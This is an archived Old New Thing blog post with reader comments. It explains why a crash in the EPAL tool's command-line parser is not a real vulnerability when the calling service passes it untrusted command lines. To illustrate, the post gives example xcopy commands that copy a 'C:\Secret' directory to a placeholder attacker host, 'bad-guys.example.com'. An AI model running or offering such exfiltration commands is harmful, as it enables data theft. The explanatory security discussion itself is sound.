<html>
<head>
<title>It rather involved being on the other side of this airtight hatchway: Elevating the elevator</title>
<link rel="stylesheet" href="page.css">
</head><body>
<div class="titlediv"><h2>It rather involved being on the other side of this airtight hatchway: Elevating the elevator</h2></div>
<div class="hdrdiv"><table class="hdrtable" cellspacing="0" cellpadding="0">
<tr><td><b>Date:</b></td><td>July 8, 2016 / year-entry #143</td></tr>
<tr><td><b>Tags:</b></td><td>code</td></tr>
<tr><td><b>Orig Link:</b></td><td>https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845</td></tr>

<tr><td><b>Comments:&nbsp;&nbsp;&nbsp;&nbsp;</b></td><td>11</td></tr>
<tr><td valign="top"><b>Summary:</b></td><td valign="top">You already control the horizontal and the vertical.</td></tr>
</table></div>
<hr/>
<table class="contenttable" cellspacing="0" cellpadding="0"><tr><td><div class="contentdiv">
<!-- CONTENT START -->
<p>
The EPAL
tool is used on Windows 2000 systems as an application compatibility
workaround:
If there is some program that requires elevation,
but you don't want to give your users administrator privileges,
you can use the EPAL tool to run that program with the security
of the EPAL program,
but under the identity of the unprivileged user.
</p>
<p>
The idea here is that you run EPAL under a high-privilege account,
and let is perform specific actions as the low-privileged user.
For example, maybe you have a program that requires database administrator
permission to add a new customer to your database.
You don't want Bob to have to call you every time he needs to add
a user, so you set up a procedure that goes like this:
</p>
<ul>
<li>Bob files a request to add a new customer.
<li>A service process running with database
    administrator privileges receives
    the request.</p>
<li>The service process uses the EPAL program to run
    <code>add_customer.exe</code> under Bob's identity,
    but with database administrator privileges.
    Since the program runs with database administrator privileges,
    the operation successfully adds the customer;
    but since the program is running under Bob's identity,
    the record will be owned by Bob.
</ul>
<p>
A security vulnerability report claimed to have found a bug
in the command line parser of the
<a HREF="https://msdn.microsoft.com/en-us/library/bb727155.aspx">
EPAL</a> tool.
A carefully-crafted command line causes the EPAL command
line parser to crash,
and the finder was confident with that some more work, it may be
possible to convert this crash into a full remote code execution
exploit.
</p>
<p>
That's great, but let's look at the attack vector.
To carry out this attack, you need to convince the service process
to run the EPAL program with a command line that you control.
That way, you can pass the carefully-crafted command line to the
service, and it passes the command line to EPAL,
and you know pwn the EPAL process.
</p>
<p>
Yeah, but so what?
If you can convince the service to pass an arbitrary command line
to EPAL,
then there's no need to do all this command line crafting to
get EPAL to do your bidding.
EPAL is already going to do your bidding because
<i>it runs the command line you gave it</i>.
</p>
<p>
Instead of crafting a command line that copies all the files
in the <code>C:\<wbr>Secret</code> directory to an Internet site,
just craft this extremely sneaky command line:
</p>
<pre>
xcopy C:\Secret \\bad-guys.example.com\uploads\pwnz0rd
</pre>
<p>
EPAL's job is to run the command you pass to it.
So just pass the command you want to run!
</p>
<p>
In other words, if you can control the command line passed to EPAL,
then instead of
</p>
<pre>
attack_epal carefully-crafted-command-line
</pre>
<p>
just do
</p>
<pre>
attack_epal xcopy.exe c:\Secret \\bad-guys.example.com\uploads\pwnz0rd
</pre>
<p>
The real vulnerability is that the service process is blindly
executing an untrusted command line provided by Bob.
</p>
<p>
The service should make sure that any untrusted information received
from Bob is fully sanitized before passing it to EPAL.
Because EPAL is basically CreateProcess.</p>
<!-- CONTENT END -->
</div></td></tr></table>
<hr/>
<table class="commenttable" cellspacing="0" cellpadding="0"><tr><td><div class="commentdiv"><div class="commentdivhdr">
<!-- COMMENTS START -->
Comments (11)	</div>

	
			<div class="navigation pagination clear-both">
					</div>

		<ol class="comment-list">
					<li class="comment even thread-even depth-1 parent" id="comment-1255485">
				<div id="div-comment-1255485" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Karellen</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255485">
			July 8, 2016 at 7:18 am</a>		</div>

		<p>On the other hand, the service might intend to allow the user to execute a command that should be &#8220;safe&#8221;, like for example &#8220;dir c:\secret\[anything]&#8221; to get a directory listing that they wouldn&#8217;t normally have access to.</p>
<p>If the service has a well-written command line parser that does not crash on carefully-crafted input, and checks that [anything] doesn&#8217;t contain &#8220;..&#8221;, or a space that would allows the user to also get a listing of c:\ultrasecret\, then a carefully-crafted [anything] might pass the service&#8217;s &#8220;trust&#8221;, but could still manage arbitrary code execution as Administrator via EPAL.</p>
<p>I suppose it depends on how carefully crafted the command line needs to be, and where the vulnerabilities are.</p>

		
				</div>
		<ol class="children">
		<li class="comment odd alt depth-2 parent" id="comment-1255495">
				<div id="div-comment-1255495" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joshua</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255495">
			July 8, 2016 at 8:07 am</a>		</div>

		<p>Indeed; there are lots of programs that are safe against arbitrary command tails. So we have</p>
<p>    run_epal specific-command hardcoded-argument arbitrary-arguments</p>
<p>but epal has its own command-line to crash vulnerablility so we now have</p>
<p>    run_epal specific-command hardcoded-argument epal-attack-vector</p>
<p>which only yields admin because epal had a vulnerability.</p>
<p>The valid form of this is common in the Unix world but obscure in the Windows world. I never would have thought I would have caught Raymond at Windows-specific thinking until today. Normally security hatchway is the submitter being an idiot; not today. At least epal is CreateProcess not cmd /c which is just too hard to secure.</p>

		
				</div>
		<ol class="children">
		<li class="comment even depth-3" id="comment-1255515">
				<div id="div-comment-1255515" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Mike Caron</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255515">
			July 8, 2016 at 8:29 am</a>		</div>

		<p>But, what does this have to do with EPAL? The bug is in the service.</p>
<p>Put another way, EPAL is a police office, who has the authority to arrest someone. The proposed vulnerability is that someone found that if you ask a Judge to issue a confusing but carefully worded warrant, the officer will arrest someone other than the intended person.</p>
<p>But, the thing is, if you have the power to ask the Judge to ask the officer to arrest someone, you can just ask them to arrest the person you wanted directly. The vulnerability is that the Judge is listening to you, not that the officer is listening to the Judge.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment byuser comment-author-davebacher odd alt depth-3 parent" id="comment-1255525">
				<div id="div-comment-1255525" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn"><a href='https://social.msdn.microsoft.com/profile/Dave+Bacher' rel='external nofollow' class='url'>Dave Bacher</a></cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255525">
			July 8, 2016 at 11:28 am</a>		</div>

		<p>Unless I&#8217;m missing something in the EPAL documentation, the user does not get to specify any part of the command line.  It is strictly &#8220;run this already registered program with the already registered command line.&#8221;</p>
<p>So it isn&#8217;t like, say, sudo where you can run adduser and specify some parameters &#8212; it&#8217;s more of a &#8220;run job 123 now.&#8221;</p>

		
				</div>
		<ol class="children">
		<li class="comment even depth-4 parent" id="comment-1255535">
				<div id="div-comment-1255535" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joshua</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255535">
			July 8, 2016 at 12:05 pm</a>		</div>

		<p>That would make it an almost useless tool that can&#8217;t fulfill Raymond&#8217;s example of add_customer.exe to add a customer to the database (which is obviously not a zero-parameter operation).</p>

		
				</div>
		<ol class="children">
		<li class="comment byuser comment-author-davebacher odd alt depth-5" id="comment-1255555">
				<div id="div-comment-1255555" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn"><a href='https://social.msdn.microsoft.com/profile/Dave+Bacher' rel='external nofollow' class='url'>Dave Bacher</a></cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255555">
			July 8, 2016 at 1:21 pm</a>		</div>

		<p><a href="https://msdn.microsoft.com/en-us/library/bb727155.aspx" rel="nofollow">https://msdn.microsoft.com/en-us/library/bb727155.aspx</a></p>
<p>Raymond&#8217;s example is a wizard &#8212; it displays a dialog box with a next button.  You don&#8217;t make Bob in accounting open a shell prompt, that ends in tears.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment byuser comment-author-dwalker-wk even depth-5" id="comment-1255626">
				<div id="div-comment-1255626" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn"><a href='https://social.msdn.microsoft.com/profile/DWalker' rel='external nofollow' class='url'>DWalker</a></cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255626">
			July 11, 2016 at 6:47 am</a>		</div>

		<p>Apparently the PROGRAM signature needs to be registered; the parameters passed to it do not.  So the name of the user to be added is a parameter.  That&#8217;s what Raymond means by saying the program needs to validate its input (or at least not to blindly run its parameter as a command line).</p>

		
				</div>
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		<li class="comment odd alt depth-3" id="comment-1255576">
				<div id="div-comment-1255576" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Joshua</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255576">
			July 9, 2016 at 7:04 am</a>		</div>

		<p>I retract my statement and replace it with &#8220;Holy shatter attacks!&#8221; Spawning UI from an elevated user on another user&#8217;s screen is a bad idea.</p>
<p>(runas doesn&#8217;t apply because the invoking user has the other user&#8217;s password.)</p>

		
				</div>
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		<li class="comment even thread-odd thread-alt depth-1" id="comment-1255505">
				<div id="div-comment-1255505" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Engywuck</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255505">
			July 8, 2016 at 8:10 am</a>		</div>

		<p>On the EPAL site <a href="https://msdn.microsoft.com/en-us/library/bb727155.aspx" rel="nofollow">https://msdn.microsoft.com/en-us/library/bb727155.aspx</a> it looks like the program to be executed is authorized by an administrator and is identified by its signature: &#8220;When the application is registered you must have a copy of the exe available because the application needs it to generate the account, group names, and a digital signature.&#8221;</p>
<p>So either the wannabe-attacker attacked the tool to generate these permissions &#8211; in which case he is already AD-admin &#8211; or he really found a way to change command-line options of an approved program. In the latter case there might be some security problems.</p>

		
				</div>
		</li><!-- #comment-## -->
		<li class="comment byuser comment-author-ramon-sola odd alt thread-even depth-1 parent" id="comment-1255565">
				<div id="div-comment-1255565" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn"><a href='https://social.msdn.microsoft.com/profile/Ram%C3%B3n+Sola' rel='external nofollow' class='url'>Ramón Sola</a></cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255565">
			July 8, 2016 at 5:34 pm</a>		</div>

		<p>Aside comment. Is the post excerpt an intentional reference to The Outer Limits? I&#8217;ve found it very funny.</p>

		
				</div>
		<ol class="children">
		<li class="comment even depth-2" id="comment-1255585">
				<div id="div-comment-1255585" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn">Ron O</cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="https://blogs.msdn.microsoft.com/oldnewthing/20160708-00/?p=93845#comment-1255585">
			July 9, 2016 at 7:18 am</a>		</div>

		<p>Yep! That&#8217;s the reference.</p>

		
				</div>
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		<div class="navigation pagination">
					</div>

	
			<p class="no-comments">Comments are closed.</p>
<!-- COMMENTS END -->
</div></td></tr></table>

</body>
</html>
<br/><div class="disclaimer">
*DISCLAIMER: I DO NOT OWN THIS CONTENT. If you are the owner and would like it removed, please
<a target="_blank" href="/contact.htm">contact me</a>.
The content herein is an archived reproduction of entries from
Raymond Chen's "Old New Thing" Blog (most recent link is <a target="_blank" href="https://devblogs.microsoft.com/oldnewthing/">here</a>).
It may have slight formatting modifications for consistency and to improve readability.
<br/><br/>
WHY DID I DUPLICATE THIS CONTENT HERE?
Let me first say this site has never had anything to sell and has never shown ads of any kind. I have nothing monetarily to gain by duplicating content here.
Because I had made my own local copy of this content throughout the years, for ease of using tools like grep, I decided to put it online after I discovered
some of the original content previously and publicly available, had disappeared approximately early to mid 2019.
At the same time, I present the content in an easily accessible theme-agnostic way.
<br/><br/>
The information provided by Raymond's blog is, for all practical purposes, more authoritative on Windows Development than Microsoft's
own MSDN documentation and should be considered supplemental reading to that documentation. The wealth of missing details
provided by this blog that Microsoft could not or did not document about Windows over the years is vital enough, many would agree an online "backup" of these details
is a necessary endeavor. Specifics include:<br/>
<ul>
    <li>
        A "redesign" after 2019 erased thousands of user's comments from previous years. As many have stated, the comments are nearly as important as the postings themselves.
        The archived copies of the postings contained here retain the original comments.
    </li>
    <li>
        The blog has changed domains many times and the urls have otherwise been under constant change since 2003.
        Even when proper redirection has been set up for those links, redirection only works for a limited period of time.
        For example, all of the internal blog links that were valid in early 2019, were broken by 2020 without proper redirection.
    </li>
    <li>
        The blog has been under constant re-design and re-theming since its inception.
        It is downright irritating to deal with a bogged-down site experience as the result of the latest visual themes designed for cell-phone browsers.
        As of this writing, it is cumbersome to navigate titles with only 10 entries per page.
        While it is nice that the official site has a search feature, searching using this index (with all titles on a single page) is much quicker (CTRL-F in most browsers).
    </li>
</ul>
</div><br/>
&lt;-- Back to <a href="index.htm">Old New Thing Archive Index</a>

